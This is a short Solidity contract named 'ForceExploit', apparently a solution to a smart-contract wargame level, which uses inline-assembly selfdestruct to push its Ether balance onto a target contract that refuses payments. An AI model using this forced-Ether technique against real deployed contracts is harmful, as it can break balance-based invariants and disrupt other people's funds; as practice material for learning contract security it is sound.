// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

contract ForceExploit {
    address payable force;

    constructor(address payable _force) payable {
        force = _force;
    }

    function exploit() public {
        assembly {
            selfdestruct(sload(force.slot))
        }
    }
}
